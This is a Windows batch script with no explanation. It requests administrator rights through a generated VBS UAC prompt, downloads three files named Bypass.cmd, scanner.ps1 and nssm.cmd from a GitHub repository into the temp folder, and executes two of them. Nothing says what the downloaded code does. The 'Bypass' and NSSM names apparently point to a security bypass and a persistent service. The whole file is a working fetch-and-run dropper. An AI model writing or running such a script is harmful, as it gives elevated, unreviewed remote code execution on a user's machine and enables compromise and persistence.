@echo off
setlocal

:: BatchGotAdmin
:-------------------------------------
if "%PROCESSOR_ARCHITECTURE%" EQU "amd64" (
>nul 2>&1 "%SYSTEMROOT%\SysWOW64\cacls.exe" "%SYSTEMROOT%\SysWOW64\config\system"
) else (
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system")
if '%errorlevel%' NEQ '0' (
    echo Requesting administrative privileges...
    goto UACPrompt
) else ( goto gotAdmin )

:UACPrompt
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
    set params= %*
    echo UAC.ShellExecute "cmd.exe", "/c ""%~s0"" %params:"=""%", "", "runas", 1 >> "%temp%\getadmin.vbs"

    "%temp%\getadmin.vbs"
    del "%temp%\getadmin.vbs"
    exit /B

:gotAdmin
    pushd "%CD%"
    CD /D "%~dp0" 

:: Configuration
set "BYPASS_URL=https://raw.githubusercontent.com/Drakovthe6th/TBuG/master/Bypass.cmd"
set "SCANNER_URL=https://raw.githubusercontent.com/Drakovthe6th/TBuG/master/scanner.ps1"
set "NSSM_URL=https://raw.githubusercontent.com/Drakovthe6th/TBuG/master/nssm.cmd"
set "BYPASS_FILE=%temp%\Bypass.cmd"
set "SCANNER_FILE=%temp%\scanner.ps1"
set "NSSM_FILE=%temp%\nssm.cmd"

:: Download files
powershell -Command "Invoke-WebRequest -Uri '%BYPASS_URL%' -OutFile '%BYPASS_FILE%'"
powershell -Command "Invoke-WebRequest -Uri '%SCANNER_URL%' -OutFile '%SCANNER_FILE%'"
powershell -Command "Invoke-WebRequest -Uri '%NSSM_URL%' -OutFile '%NSSM_FILE%'"

:: Execute components
if exist "%BYPASS_FILE%" call "%BYPASS_FILE%"
if exist "%NSSM_FILE%" call "%NSSM_FILE%"

endlocal